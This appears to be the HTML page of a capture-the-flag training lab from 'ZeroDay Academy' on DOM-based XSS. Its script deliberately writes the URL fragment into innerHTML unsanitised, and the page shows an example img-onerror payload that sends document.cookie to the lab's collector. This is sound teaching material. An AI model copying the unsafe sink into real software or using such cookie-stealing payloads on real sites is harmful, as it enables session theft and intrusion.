<!doctype html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WelcomeHub — Personalized Greeting</title>
<link rel="stylesheet" href="/css/lab.css">
</head>
<body data-theme="xss">
<div class="lab-topbar"><a class="lab-back" href="/challenges">&larr; ZeroDay Academy</a><span class="name">WelcomeHub</span><span class="tag">/labs/dom-xss-hash</span></div>
<div class="lab-wrap">
  <div class="lab-card">
    <h1>Welcome!</h1>
    <p>Customize your greeting by adding your name to the URL fragment. The value is written with <code>innerHTML</code>.</p>
    <div id="greeting" style="font-size:1.2rem;margin-top:1rem;padding:1rem;border-radius:8px;background:rgba(255,255,255,0.05);"></div>
  </div>

  <div class="lab-card">
    <h2>Proof collector</h2>
    <p>The page issues a non-HttpOnly proof cookie. Execute script in this origin that sends the cookie to the collector, then verify.</p>
    <pre class="lab-code"># Example payload appended to the URL:
&lt;img src=x onerror="fetch('/labs/dom-xss-hash/collect?p='+encodeURIComponent(document.cookie))"&gt;
# URL:
/labs/dom-xss-hash#&lt;img src=x onerror="..."&gt;</pre>
    <button type="button" class="secondary" id="checkDom">Check verification</button>
    <pre class="lab-code" id="domResult" style="margin-top:0.8rem;">Not checked yet.</pre>
  </div>

  <form method="POST" action="/labs/dom-xss-hash/reset"><button type="submit" class="secondary">Reset lab</button></form>
</div>
<script>
  var name = decodeURIComponent(location.hash.slice(1)) || "visitor";
  document.getElementById("greeting").innerHTML = "Hello, " + name + "! Welcome to WelcomeHub.";

  document.getElementById('checkDom').addEventListener('click', async function () {
    const out = document.getElementById('domResult');
    try {
      const response = await fetch('/labs/dom-xss-hash/status');
      const data = await response.json();
      out.textContent = JSON.stringify(data, null, 2);
      if (data.flag) out.textContent += '\n\nFLAG: ' + data.flag;
    } catch (error) {
      out.textContent = 'Status check failed: ' + error.message;
    }
  });
</script>
</body>
</html>
